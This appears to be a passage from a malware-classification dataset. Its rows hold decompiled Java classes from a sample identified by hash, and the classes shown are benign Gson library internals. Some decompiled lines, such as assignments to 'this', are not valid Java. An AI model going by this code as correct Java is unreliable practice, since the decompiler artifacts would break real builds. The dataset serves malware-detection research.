cls){     if (type == Properties.class) {       return new Type[]{String.class,String.class};     }     Type supertype=getSupertype(type,cls,Map.class);     return supertype instanceof ParameterizedType ? ((ParameterizedType)supertype).getActualTypeArguments() : new Type[]{Object.class,Object.class};   }   public static Class<?> getRawType(  Type type){     if (type instanceof Class) {       return (Class)type;     }     if (type instanceof ParameterizedType) {       Type rawType=((ParameterizedType)type).getRawType();       C$Gson$Preconditions.checkArgument(rawType instanceof Class);       return (Class)rawType;     }     if (type instanceof GenericArrayType) {       return Array.newInstance(getRawType(((GenericArrayType)type).getGenericComponentType()),0).getClass();     }     if (type instanceof TypeVariable) {       return Object.class;     }     if (type instanceof WildcardType) {       return getRawType(((WildcardType)type).getUpperBounds()[0]);     }     throw new IllegalArgumentException(""Expected a Class, ParameterizedType, or GenericArrayType, but <"" + type + ""> is of type ""+ (type == null ? ""null"" : type.getClass().getName()));   }   static Type getSupertype(  Type type,  Class<?> cls,  Class<?> cls2){     C$Gson$Preconditions.checkArgument(cls2.isAssignableFrom(cls));     return resolve(type,cls,getGenericSupertype(type,cls,cls2));   }   public static int hashCodeOrZero(  Object obj){     if (obj != null) {       return obj.hashCode();     }     return 0;   }   private static int indexOf(  Object[] objArr,  Object obj){     for (int i=0; i < objArr.length; i++) {       if (obj.equals(objArr[i])) {         return i;       }     }     throw new NoSuchElementException();   }   public static ParameterizedType newParameterizedTypeWithOwner(  Type type,  Type type2,  Type... typeArr){     return new ParameterizedTypeImpl(type,type2,typeArr);   }   public static Type resolve(  Type type,  Class<?> cls,  Type type2){     Type resolve;     TypeVariable typeVariable;     do {       Type type3=type2;       if (!(type3 instanceof TypeVariable)) {         if ((type3 instanceof Class) && ((Class)type3).isArray()) {           Class cls2=(Class)type3;           Class<?> componentType=cls2.getComponentType();           Type resolve2=resolve(type,cls,componentType);           return componentType != resolve2 ? arrayOf(resolve2) : cls2;         }         if (type3 instanceof GenericArrayType) {           GenericArrayType genericArrayType=(GenericArrayType)type3;           Type genericComponentType=genericArrayType.getGenericComponentType();           Type resolve3=resolve(type,cls,genericComponentType);           return genericComponentType != resolve3 ? arrayOf(resolve3) : genericArrayType;         }         if (!(type3 instanceof ParameterizedType)) {           if (!(type3 instanceof WildcardType)) {             return type3;           }           WildcardType wildcardType=(WildcardType)type3;           Type[] lowerBounds=wildcardType.getLowerBounds();           Type[] upperBounds=wildcardType.getUpperBounds();           if (lowerBounds.length != 1) {             return (upperBounds.length != 1 || (resolve=resolve(type,cls,upperBounds[0])) == upperBounds[0]) ? wildcardType : subtypeOf(resolve);           }           Type resolve4=resolve(type,cls,lowerBounds[0]);           return resolve4 != lowerBounds[0] ? supertypeOf(resolve4) : wildcardType;         }         ParameterizedType parameterizedType=(ParameterizedType)type3;         Type ownerType=parameterizedType.getOwnerType();         Type resolve5=resolve(type,cls,ownerType);         boolean z=resolve5 != ownerType;         Type[] actualTypeArguments=parameterizedType.getActualTypeArguments();         int length=actualTypeArguments.length;         boolean z2=z;         Type[] typeArr=actualTypeArguments;         for (int i=0; i < length; i++) {           Type resolve6=resolve(type,cls,typeArr[i]);           if (resolve6 != typeArr[i]) {             if (!z2) {               typeArr=(Type[])typeArr.clone();               z2=true;             }             typeArr[i]=resolve6;           }         }         return z2 ? newParameterizedTypeWithOwner(resolve5,parameterizedType.getRawType(),typeArr) : parameterizedType;       }       typeVariable=(TypeVariable)type3;       type2=resolveTypeVariable(type,cls,typeVariable);     }  while (type2 != typeVariable);     return type2;   }   static Type resolveTypeVariable(  Type type,  Class<?> cls,  TypeVariable<?> typeVariable){     Class<?> declaringClassOf=declaringClassOf(typeVariable);     if (declaringClassOf == null) {       return typeVariable;     }     Type genericSupertype=getGenericSupertype(type,cls,declaringClassOf);     if (!(genericSupertype instanceof ParameterizedType)) {       return typeVariable;     }     return ((ParameterizedType)genericSupertype).getActualTypeArguments()[indexOf(declaringClassOf.getTypeParameters(),typeVariable)];   }   public static WildcardType subtypeOf(  Type type){     return new WildcardTypeImpl(new Type[]{type},EMPTY_TYPE_ARRAY);   }   public static WildcardType supertypeOf(  Type type){     return new WildcardTypeImpl(new Type[]{Object.class},new Type[]{type});   }   public static String typeToString(  Type type){     return type instanceof Class ? ((Class)type).getName() : type.toString();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal\ConstructorConstructor.code","public final class ConstructorConstructor {   private final Map<Type,InstanceCreator<?>> instanceCreators;   public ConstructorConstructor(  Map<Type,InstanceCreator<?>> map){     this.instanceCreators=map;   }   private <T>ObjectConstructor<T> newDefaultConstructor(  Class<? super T> cls){     try {       final Constructor<? super T> declaredConstructor=cls.getDeclaredConstructor(new Class[0]);       if (!declaredConstructor.isAccessible()) {         declaredConstructor.setAccessible(true);       }       return new ObjectConstructor<T>(){         @Override public T construct(){           try {             return (T)declaredConstructor.newInstance(null);           }  catch (          IllegalAccessException e) {             throw new AssertionError(e);           } catch (          InstantiationException e2) {             throw new RuntimeException(""Failed to invoke "" + declaredConstructor + "" with no args"",e2);           } catch (          InvocationTargetException e3) {             throw new RuntimeException(""Failed to invoke "" + declaredConstructor + "" with no args"",e3.getTargetException());           }         }       } ;     }  catch (    NoSuchMethodException e) {       return null;     }   }   private <T>ObjectConstructor<T> newDefaultImplementationConstructor(  final Type type,  Class<? super T> cls){     if (Collection.class.isAssignableFrom(cls)) {       return SortedSet.class.isAssignableFrom(cls) ? new ObjectConstructor<T>(){         @Override public T construct(){           return (T)new TreeSet();         }       }  : EnumSet.class.isAssignableFrom(cls) ? new ObjectConstructor<T>(){         @Override public T construct(){           if (!(type instanceof ParameterizedType)) {             throw new JsonIOException(""Invalid EnumSet type: "" + type.toString());           }           Type type2=((ParameterizedType)type).getActualTypeArguments()[0];           if (type2 instanceof Class) {             return (T)EnumSet.noneOf((Class)type2);           }           throw new JsonIOException(""Invalid EnumSet type: "" + type.toString());         }       }  : Set.class.isAssignableFrom(cls) ? new ObjectConstructor<T>(){         @Override public T construct(){           return (T)new LinkedHashSet();         }       }  : Queue.class.isAssignableFrom(cls) ? new ObjectConstructor<T>(){         @Override public T construct(){           return (T)new LinkedList();         }       }  : new ObjectConstructor<T>(){         @Override public T construct(){           return (T)new ArrayList();         }       } ;     }     if (Map.class.isAssignableFrom(cls)) {       return SortedMap.class.isAssignableFrom(cls) ? new ObjectConstructor<T>(){         @Override public T construct(){           return (T)new TreeMap();         }       }  : (!(type instanceof ParameterizedType) || String.class.isAssignableFrom(TypeToken.get(((ParameterizedType)type).getActualTypeArguments()[0]).getRawType())) ? new ObjectConstructor<T>(){         @Override public T construct(){           return (T)new LinkedTreeMap();         }       }  : new ObjectConstructor<T>(){         @Override public T construct(){           return (T)new LinkedHashMap();         }       } ;     }     return null;   }   private <T>ObjectConstructor<T> newUnsafeAllocator(  final Type type,  final Class<? super T> cls){     return new ObjectConstructor<T>(){       private final UnsafeAllocator unsafeAllocator=UnsafeAllocator.create();       @Override public T construct(){         try {           return (T)this.unsafeAllocator.newInstance(cls);         }  catch (        Exception e) {           throw new RuntimeException(""Unable to invoke no-args constructor for "" + type + "". Register an InstanceCreator with Gson for this type may fix this problem."",e);         }       }     } ;   }   public <T>ObjectConstructor<T> get(  TypeToken<T> typeToken){     final Type type=typeToken.getType();     Class<? super T> rawType=typeToken.getRawType();     final InstanceCreator<?> instanceCreator=this.instanceCreators.get(type);     if (instanceCreator != null) {       return new ObjectConstructor<T>(){         @Override public T construct(){           return (T)instanceCreator.createInstance(type);         }       } ;     }     final InstanceCreator<?> instanceCreator2=this.instanceCreators.get(rawType);     if (instanceCreator2 != null) {       return new ObjectConstructor<T>(){         @Override public T construct(){           return (T)instanceCreator2.createInstance(type);         }       } ;     }     ObjectConstructor<T> newDefaultConstructor=newDefaultConstructor(rawType);     if (newDefaultConstructor != null) {       return newDefaultConstructor;     }     ObjectConstructor<T> newDefaultImplementationConstructor=newDefaultImplementationConstructor(type,rawType);     return newDefaultImplementationConstructor == null ? newUnsafeAllocator(type,rawType) : newDefaultImplementationConstructor;   }   public String toString(){     return this.instanceCreators.toString();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal\CurrentWrite.code","class CurrentWrite implements CharSequence {   char[] chars;   CurrentWrite(){   }   @Override public char charAt(  int i){     return this.chars[i];   }   @Override public int length(){     return this.chars.length;   }   @Override public CharSequence subSequence(  int i,  int i2){     return new String(this.chars,i,i2 - i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal\EntrySet.code","class EntrySet extends AbstractSet<Map.Entry<K,V>> {   EntrySet(){   }   @Override public void clear(){     LinkedTreeMap.this.clear();   }   @Override public boolean contains(  Object obj){     return (obj instanceof Map.Entry) && LinkedTreeMap.this.findByEntry((Map.Entry)obj) != null;   }   @Override public Iterator<Map.Entry<K,V>> iterator(){     return new LinkedTreeMap<K,V>.LinkedTreeMapIterator<Map.Entry<K,V>>(){ {         LinkedTreeMap linkedTreeMap=LinkedTreeMap.this;       }       @Override public Map.Entry<K,V> next(){         return nextNode();       }     } ;   }   @Override public boolean remove(  Object obj){     Node<K,V> findByEntry;     if (!(obj instanceof Map.Entry) || (findByEntry=LinkedTreeMap.this.findByEntry((Map.Entry)obj)) == null) {       return false;     }     LinkedTreeMap.this.removeInternal(findByEntry,true);     return true;   }   @Override public int size(){     return LinkedTreeMap.this.size;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal\Excluder.code","public final class Excluder implements TypeAdapterFactory, Cloneable {   public static final Excluder DEFAULT=new Excluder();   private static final double IGNORE_VERSIONS=-1.0d;   private boolean requireExpose;   private double version=IGNORE_VERSIONS;   private int modifiers=136;   private boolean serializeInnerClasses=true;   private List<ExclusionStrategy> serializationStrategies=Collections.emptyList();   private List<ExclusionStrategy> deserializationStrategies=Collections.emptyList();   private boolean isAnonymousOrLocal(  Class<?> cls){     return !Enum.class.isAssignableFrom(cls) && (cls.isAnonymousClass() || cls.isLocalClass());   }   private boolean isInnerClass(  Class<?> cls){     return cls.isMemberClass() && !isStatic(cls);   }   private boolean isStatic(  Class<?> cls){     return (cls.getModifiers() & 8) != 0;   }   private boolean isValidSince(  Since since){     return since == null || since.value() <= this.version;   }   private boolean isValidUntil(  Until until){     return until == null || until.value() > this.version;   }   private boolean isValidVersion(  Since since,  Until until){     return isValidSince(since) && isValidUntil(until);   }   public Excluder m1clone(){     try {       return (Excluder)super.clone();     }  catch (    CloneNotSupportedException e) {       throw new AssertionError();     }   }   @Override public <T>TypeAdapter<T> create(  final Gson gson,  final TypeToken<T> typeToken){     Class<? super T> rawType=typeToken.getRawType();     final boolean excludeClass=excludeClass(rawType,true);     final boolean excludeClass2=excludeClass(rawType,false);     if (excludeClass || excludeClass2) {       return new TypeAdapter<T>(){         private TypeAdapter<T> delegate;         private TypeAdapter<T> delegate(){           TypeAdapter<T> typeAdapter=this.delegate;           if (typeAdapter != null) {             return typeAdapter;           }           TypeAdapter<T> delegateAdapter=gson.getDelegateAdapter(Excluder.this,typeToken);           this.delegate=delegateAdapter;           return delegateAdapter;         }         @Override public T read(        JsonReader jsonReader){           if (!excludeClass2) {             return delegate().read(jsonReader);           }           jsonReader.skipValue();           return null;         }         @Override public void write(        JsonWriter jsonWriter,        T t){           if (excludeClass) {             jsonWriter.nullValue();           }  else {             delegate().write(jsonWriter,t);           }         }       } ;     }     return null;   }   public Excluder disableInnerClassSerialization(){     Excluder m1clone=m1clone();     m1clone.serializeInnerClasses=false;     return m1clone;   }   public boolean excludeClass(  Class<?> cls,  boolean z){     if (this.version != IGNORE_VERSIONS && !isValidVersion((Since)cls.getAnnotation(Since.class),(Until)cls.getAnnotation(Until.class))) {       return true;     }     if ((this.serializeInnerClasses || !isInnerClass(cls)) && !isAnonymousOrLocal(cls)) {       Iterator<ExclusionStrategy> it=(z ? this.serializationStrategies : this.deserializationStrategies).iterator();       while (it.hasNext()) {         if (it.next().shouldSkipClass(cls)) {           return true;         }       }       return false;     }     return true;   }   public boolean excludeField(  Field field,  boolean z){     Expose expose;     if ((this.modifiers & field.getModifiers()) != 0) {       return true;     }     if ((this.version == IGNORE_VERSIONS || isValidVersion((Since)field.getAnnotation(Since.class),(Until)field.getAnnotation(Until.class))) && !field.isSynthetic()) {       if (this.requireExpose && ((expose=(Expose)field.getAnnotation(Expose.class)) == null || (!z ? expose.deserialize() : expose.serialize()))) {         return true;       }       if ((this.serializeInnerClasses || !isInnerClass(field.getType())) && !isAnonymousOrLocal(field.getType())) {         List<ExclusionStrategy> list=z ? this.serializationStrategies : this.deserializationStrategies;         if (!list.isEmpty()) {           FieldAttributes fieldAttributes=new FieldAttributes(field);           Iterator<ExclusionStrategy> it=list.iterator();           while (it.hasNext()) {             if (it.next().shouldSkipField(fieldAttributes)) {               return true;             }           }         }         return false;       }       return true;     }     return true;   }   public Excluder excludeFieldsWithoutExposeAnnotation(){     Excluder m1clone=m1clone();     m1clone.requireExpose=true;     return m1clone;   }   public Excluder withExclusionStrategy(  ExclusionStrategy exclusionStrategy,  boolean z,  boolean z2){     Excluder m1clone=m1clone();     if (z) {       m1clone.serializationStrategies=new ArrayList(this.serializationStrategies);       m1clone.serializationStrategies.add(exclusionStrategy);     }     if (z2) {       m1clone.deserializationStrategies=new ArrayList(this.deserializationStrategies);       m1clone.deserializationStrategies.add(exclusionStrategy);     }     return m1clone;   }   public Excluder withModifiers(  int... iArr){     Excluder m1clone=m1clone();     m1clone.modifiers=0;     for (    int i : iArr) {       m1clone.modifiers=i | m1clone.modifiers;     }     return m1clone;   }   public Excluder withVersion(  double d){     Excluder m1clone=m1clone();     m1clone.version=d;     return m1clone;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal\GenericArrayTypeImpl.code","public final class GenericArrayTypeImpl implements Serializable, GenericArrayType {   private static final long serialVersionUID=0;   private final Type componentType;   public GenericArrayTypeImpl(  Type type){     this.componentType=C$Gson$Types.canonicalize(type);   }   public boolean equals(  Object obj){     return (obj instanceof GenericArrayType) && C$Gson$Types.equals(this,(GenericArrayType)obj);   }   @Override public Type getGenericComponentType(){     return this.componentType;   }   public int hashCode(){     return this.componentType.hashCode();   }   public String toString(){     return C$Gson$Types.typeToString(this.componentType) + ""[]"";   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal\JsonReaderInternalAccess.code","public abstract class JsonReaderInternalAccess {   public static JsonReaderInternalAccess INSTANCE;   public abstract void promoteNameToValue(  JsonReader jsonReader); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal\KeySet.code","class KeySet extends AbstractSet<K> {   KeySet(){   }   @Override public void clear(){     LinkedTreeMap.this.clear();   }   @Override public boolean contains(  Object obj){     return LinkedTreeMap.this.containsKey(obj);   }   @Override public Iterator<K> iterator(){     return new LinkedTreeMap<K,V>.LinkedTreeMapIterator<K>(){ {         LinkedTreeMap linkedTreeMap=LinkedTreeMap.this;       }       @Override public K next(){         return nextNode().key;       }     } ;   }   @Override public boolean remove(  Object obj){     return LinkedTreeMap.this.removeInternalByKey(obj) != null;   }   @Override public int size(){     return LinkedTreeMap.this.size;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal\LazilyParsedNumber.code","public final class LazilyParsedNumber extends Number {   private final String value;   public LazilyParsedNumber(  String str){     this.value=str;   }   private Object writeReplace(){     return new BigDecimal(this.value);   }   @Override public double doubleValue(){     return Double.parseDouble(this.value);   }   @Override public float floatValue(){     return Float.parseFloat(this.value);   }   @Override public int intValue(){     try {       return Integer.parseInt(this.value);     }  catch (    NumberFormatException e) {       try {         return (int)Long.parseLong(this.value);       }  catch (      NumberFormatException e2) {         return new BigDecimal(this.value).intValue();       }     }   }   @Override public long longValue(){     try {       return Long.parseLong(this.value);     }  catch (    NumberFormatException e) {       return new BigDecimal(this.value).longValue();     }   }   public String toString(){     return this.value;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal\LinkedTreeMap.code","public final class LinkedTreeMap<K,V> extends AbstractMap<K,V> implements Serializable {   static final boolean $assertionsDisabled;   private static final Comparator<Comparable> NATURAL_ORDER;   Comparator<? super K> comparator;   private LinkedTreeMap<K,V>.EntrySet entrySet;   final Node<K,V> header;   private LinkedTreeMap<K,V>.KeySet keySet;   int modCount;   Node<K,V> root;   int size; class EntrySet extends AbstractSet<Map.Entry<K,V>> {     EntrySet(){     }     @Override public void clear(){       LinkedTreeMap.this.clear();     }     @Override public boolean contains(    Object obj){       return (obj instanceof Map.Entry) && LinkedTreeMap.this.findByEntry((Map.Entry)obj) != null;     }     @Override public Iterator<Map.Entry<K,V>> iterator(){       return new LinkedTreeMap<K,V>.LinkedTreeMapIterator<Map.Entry<K,V>>(){ {           LinkedTreeMap linkedTreeMap=LinkedTreeMap.this;         }         @Override public Map.Entry<K,V> next(){           return nextNode();         }       } ;     }     @Override public boolean remove(    Object obj){       Node<K,V> findByEntry;       if (!(obj instanceof Map.Entry) || (findByEntry=LinkedTreeMap.this.findByEntry((Map.Entry)obj)) == null) {         return false;       }       LinkedTreeMap.this.removeInternal(findByEntry,true);       return true;     }     @Override public int size(){       return LinkedTreeMap.this.size;     }   } class KeySet extends AbstractSet<K> {     KeySet(){     }     @Override public void clear(){       LinkedTreeMap.this.clear();     }     @Override public boolean contains(    Object obj){       return LinkedTreeMap.this.containsKey(obj);     }     @Override public Iterator<K> iterator(){       return new LinkedTreeMap<K,V>.LinkedTreeMapIterator<K>(){ {           LinkedTreeMap linkedTreeMap=LinkedTreeMap.this;         }         @Override public K next(){           return nextNode().key;         }       } ;     }     @Override public boolean remove(    Object obj){       return LinkedTreeMap.this.removeInternalByKey(obj) != null;     }     @Override public int size(){       return LinkedTreeMap.this.size;     }   } public abstract class LinkedTreeMapIterator<T> implements Iterator<T> {     int expectedModCount;     Node<K,V> lastReturned;     Node<K,V> next;     private LinkedTreeMapIterator(){       this.next=LinkedTreeMap.this.header.next;       this.lastReturned=null;       this.expectedModCount=LinkedTreeMap.this.modCount;     }     @Override public final boolean hasNext(){       return this.next != LinkedTreeMap.this.header;     }     final Node<K,V> nextNode(){       Node<K,V> node=this.next;       if (node == LinkedTreeMap.this.header) {         throw new NoSuchElementException();       }       if (LinkedTreeMap.this.modCount != this.expectedModCount) {         throw new ConcurrentModificationException();       }       this.next=node.next;       this.lastReturned=node;       return node;     }     @Override public final void remove(){       if (this.lastReturned == null) {         throw new IllegalStateException();       }       LinkedTreeMap.this.removeInternal(this.lastReturned,true);       this.lastReturned=null;       this.expectedModCount=LinkedTreeMap.this.modCount;     }   } public final class Node<K,V> implements Map.Entry<K,V> {     int height;     final K key;     Node<K,V> left;     Node<K,V> next;     Node<K,V> parent;     Node<K,V> prev;     Node<K,V> right;     V value;     Node(){       this.key=null;       this.prev=this;       this.next=this;     }     Node(    Node<K,V> node,    K k,    Node<K,V> node2,    Node<K,V> node3){       this.parent=node;       this.key=k;       this.height=1;       this.next=node2;       this.prev=node3;       node3.next=this;       node2.prev=this;     }     @Override public boolean equals(    Object obj){       if (!(obj instanceof Map.Entry)) {         return false;       }       Map.Entry entry=(Map.Entry)obj;       if (this.key == null) {         if (entry.getKey() != null) {           return false;         }       }  else       if (!this.key.equals(entry.getKey())) {         return false;       }       if (this.value == null) {         if (entry.getValue() != null) {           return false;         }       }  else       if (!this.value.equals(entry.getValue())) {         return false;       }       return true;     }     public Node<K,V> first(){       for (Node<K,V> node=this.left; node != null; node=node.left) {         this=node;       }       return this;     }     @Override public K getKey(){       return this.key;     }     @Override public V getValue(){       return this.value;     }     @Override public int hashCode(){       return (this.key == null ? 0 : this.key.hashCode()) ^ (this.value != null ? this.value.hashCode() : 0);     }     public Node<K,V> last(){       for (Node<K,V> node=this.right; node != null; node=node.right) {         this=node;       }       return this;     }     @Override public V setValue(    V v){       V v2=this.value;       this.value=v;       return v2;     }     public String toString(){       return this.key + ""="" + this.value;     }   } static {     $assertionsDisabled=!LinkedTreeMap.class.desiredAssertionStatus();     NATURAL_ORDER=new Comparator<Comparable>(){       @Override public int compare(      Comparable comparable,      Comparable comparable2){         return comparable.compareTo(comparable2);       }     } ;   }   public LinkedTreeMap(){     this(NATURAL_ORDER);   }   public LinkedTreeMap(  Comparator<? super K> comparator){     this.size=0;     this.modCount=0;     this.header=new Node<>();     this.comparator=comparator == null ? NATURAL_ORDER : comparator;   }   private boolean equal(  Object obj,  Object obj2){     return obj == obj2 || (obj != null && obj.equals(obj2));   }   private void rebalance(  Node<K,V> node,  boolean z){     while (node != null) {       Node<K,V> node2=node.left;       Node<K,V> node3=node.right;       int i=node2 != null ? node2.height : 0;       int i2=node3 != null ? node3.height : 0;       int i3=i - i2;       if (i3 == -2) {         Node<K,V> node4=node3.left;         Node<K,V> node5=node3.right;         int i4=(node4 != null ? node4.height : 0) - (node5 != null ? node5.height : 0);         if (i4 == -1 || (i4 == 0 && !z)) {           rotateLeft(node);         }  else {           if (!$assertionsDisabled && i4 != 1) {             throw new AssertionError();           }           rotateRight(node3);           rotateLeft(node);         }         if (z) {           return;         }       }  else       if (i3 == 2) {         Node<K,V> node6=node2.left;         Node<K,V> node7=node2.right;         int i5=(node6 != null ? node6.height : 0) - (node7 != null ? node7.height : 0);         if (i5 == 1 || (i5 == 0 && !z)) {           rotateRight(node);         }  else {           if (!$assertionsDisabled && i5 != -1) {             throw new AssertionError();           }           rotateLeft(node2);           rotateRight(node);         }         if (z) {           return;         }       }  else       if (i3 == 0) {         node.height=i + 1;         if (z) {           return;         }       }  else {         if (!$assertionsDisabled && i3 != -1 && i3 != 1) {           throw new AssertionError();         }         node.height=Math.max(i,i2) + 1;         if (!z) {           return;         }       }       node=node.parent;     }   }   private void replaceInParent(  Node<K,V> node,  Node<K,V> node2){     Node<K,V> node3=node.parent;     node.parent=null;     if (node2 != null) {       node2.parent=node3;     }     if (node3 == null) {       this.root=node2;       return;     }     if (node3.left == node) {       node3.left=node2;     }  else {       if (!$assertionsDisabled && node3.right != node) {         throw new AssertionError();       }       node3.right=node2;     }   }   private void rotateLeft(  Node<K,V> node){     Node<K,V> node2=node.left;     Node<K,V> node3=node.right;     Node<K,V> node4=node3.left;     Node<K,V> node5=node3.right;     node.right=node4;     if (node4 != null) {       node4.parent=node;     }     replaceInParent(node,node3);     node3.left=node;     node.parent=node3;     node.height=Math.max(node2 != null ? node2.height : 0,node4 != null ? node4.height : 0) + 1;     node3.height=Math.max(node.height,node5 != null ? node5.height : 0) + 1;   }   private void rotateRight(  Node<K,V> node){     Node<K,V> node2=node.left;     Node<K,V> node3=node.right;     Node<K,V> node4=node2.left;     Node<K,V> node5=node2.right;     node.left=node5;     if (node5 != null) {       node5.parent=node;     }     replaceInParent(node,node2);     node2.right=node;     node.parent=node2;     node.height=Math.max(node3 != null ? node3.height : 0,node5 != null ? node5.height : 0) + 1;     node2.height=Math.max(node.height,node4 != null ? node4.height : 0) + 1;   }   private Object writeReplace(){     return new LinkedHashMap(this);   }   @Override public void clear(){     this.root=null;     this.size=0;     this.modCount++;     Node<K,V> node=this.header;     node.prev=node;     node.next=node;   }   @Override public boolean containsKey(  Object obj){     return findByObject(obj) != null;   }   @Override public Set<Map.Entry<K,V>> entrySet(){     LinkedTreeMap<K,V>.EntrySet entrySet=this.entrySet;     if (entrySet != null) {       return entrySet;     }     LinkedTreeMap<K,V>.EntrySet entrySet2=new EntrySet();     this.entrySet=entrySet2;     return entrySet2;   }   Node<K,V> find(  K k,  boolean z){     Node<K,V> node;     int i;     Node<K,V> node2;     Comparator<? super K> comparator=this.comparator;     Node<K,V> node3=this.root;     if (node3 != null) {       Comparable comparable=comparator == NATURAL_ORDER ? (Comparable)k : null;       while (true) {         int compareTo=comparable != null ? comparable.compareTo(node3.key) : comparator.compare(k,node3.key);         if (compareTo == 0) {           return node3;         }         Node<K,V> node4=compareTo < 0 ? node3.left : node3.right;         if (node4 == null) {           int i2=compareTo;           node=node3;           i=i2;           break;         }         node3=node4;       }     }  else {       node=node3;       i=0;     }     if (!z) {       return null;     }     Node<K,V> node5=this.header;     if (node != null) {       node2=new Node<>(node,k,node5,node5.prev);       if (i < 0) {         node.left=node2;       }  else {         node.right=node2;       }       rebalance(node,true);     }  else {       if (comparator == NATURAL_ORDER && !(k instanceof Comparable)) {         throw new ClassCastException(k.getClass().getName() + "" is not Comparable"");       }       node2=new Node<>(node,k,node5,node5.prev);       this.root=node2;     }     this.size++;     this.modCount++;     return node2;   }   Node<K,V> findByEntry(  Map.Entry<?,?> entry){     Node<K,V> findByObject=findByObject(entry.getKey());     if (findByObject != null && equal(findByObject.value,entry.getValue())) {       return findByObject;     }     return null;   }   Node<K,V> findByObject(  Object obj){     if (obj == 0) {       return null;     }     try {       return find(obj,false);     }  catch (    ClassCastException e) {       return null;     }   }   @Override public V get(  Object obj){     Node<K,V> findByObject=findByObject(obj);     if (findByObject != null) {       return findByObject.value;     }     return null;   }   @Override public Set<K> keySet(){     LinkedTreeMap<K,V>.KeySet keySet=this.keySet;     if (keySet != null) {       return keySet;     }     LinkedTreeMap<K,V>.KeySet keySet2=new KeySet();     this.keySet=keySet2;     return keySet2;   }   @Override public V put(  K k,  V v){     if (k == null) {       throw new NullPointerException(""key == null"");     }     Node<K,V> find=find(k,true);     V v2=find.value;     find.value=v;     return v2;   }   @Override public V remove(  Object obj){     Node<K,V> removeInternalByKey=removeInternalByKey(obj);     if (removeInternalByKey != null) {       return removeInternalByKey.value;     }     return null;   }   void removeInternal(  Node<K,V> node,  boolean z){     int i;     int i2=0;     if (z) {       node.prev.next=node.next;       node.next.prev=node.prev;     }     Node<K,V> node2=node.left;     Node<K,V> node3=node.right;     Node<K,V> node4=node.parent;     if (node2 == null || node3 == null) {       if (node2 != null) {         replaceInParent(node,node2);         node.left=null;       }  else       if (node3 != null) {         replaceInParent(node,node3);         node.right=null;       }  else {         replaceInParent(node,null);       }       rebalance(node4,false);       this.size--;       this.modCount++;       return;     }     Node<K,V> last=node2.height > node3.height ? node2.last() : node3.first();     removeInternal(last,false);     Node<K,V> node5=node.left;     if (node5 != null) {       i=node5.height;       last.left=node5;       node5.parent=last;       node.left=null;     }  else {       i=0;     }     Node<K,V> node6=node.right;     if (node6 != null) {       i2=node6.height;       last.right=node6;       node6.parent=last;       node.right=null;     }     last.height=Math.max(i,i2) + 1;     replaceInParent(node,last);   }   Node<K,V> removeInternalByKey(  Object obj){     Node<K,V> findByObject=findByObject(obj);     if (findByObject != null) {       removeInternal(findByObject,true);     }     return findByObject;   }   @Override public int size(){     return this.size;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal\LinkedTreeMapIterator.code","public abstract class LinkedTreeMapIterator<T> implements Iterator<T> {   int expectedModCount;   Node<K,V> lastReturned;   Node<K,V> next;   private LinkedTreeMapIterator(){     this.next=LinkedTreeMap.this.header.next;     this.lastReturned=null;     this.expectedModCount=LinkedTreeMap.this.modCount;   }   @Override public final boolean hasNext(){     return this.next != LinkedTreeMap.this.header;   }   final Node<K,V> nextNode(){     Node<K,V> node=this.next;     if (node == LinkedTreeMap.this.header) {       throw new NoSuchElementException();     }     if (LinkedTreeMap.this.modCount != this.expectedModCount) {       throw new ConcurrentModificationException();     }     this.next=node.next;     this.lastReturned=node;     return node;   }   @Override public final void remove(){     if (this.lastReturned == null) {       throw new IllegalStateException();     }     LinkedTreeMap.this.removeInternal(this.lastReturned,true);     this.lastReturned=null;     this.expectedModCount=LinkedTreeMap.this.modCount;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal\Node.code","public final class Node<K,V> implements Map.Entry<K,V> {   int height;   final K key;   Node<K,V> left;   Node<K,V> next;   Node<K,V> parent;   Node<K,V> prev;   Node<K,V> right;   V value;   Node(){     this.key=null;     this.prev=this;     this.next=this;   }   Node(  Node<K,V> node,  K k,  Node<K,V> node2,  Node<K,V> node3){     this.parent=node;     this.key=k;     this.height=1;     this.next=node2;     this.prev=node3;     node3.next=this;     node2.prev=this;   }   @Override public boolean equals(  Object obj){     if (!(obj instanceof Map.Entry)) {       return false;     }     Map.Entry entry=(Map.Entry)obj;     if (this.key == null) {       if (entry.getKey() != null) {         return false;       }     }  else     if (!this.key.equals(entry.getKey())) {       return false;     }     if (this.value == null) {       if (entry.getValue() != null) {         return false;       }     }  else     if (!this.value.equals(entry.getValue())) {       return false;     }     return true;   }   public Node<K,V> first(){     for (Node<K,V> node=this.left; node != null; node=node.left) {       this=node;     }     return this;   }   @Override public K getKey(){     return this.key;   }   @Override public V getValue(){     return this.value;   }   @Override public int hashCode(){     return (this.key == null ? 0 : this.key.hashCode()) ^ (this.value != null ? this.value.hashCode() : 0);   }   public Node<K,V> last(){     for (Node<K,V> node=this.right; node != null; node=node.right) {       this=node;     }     return 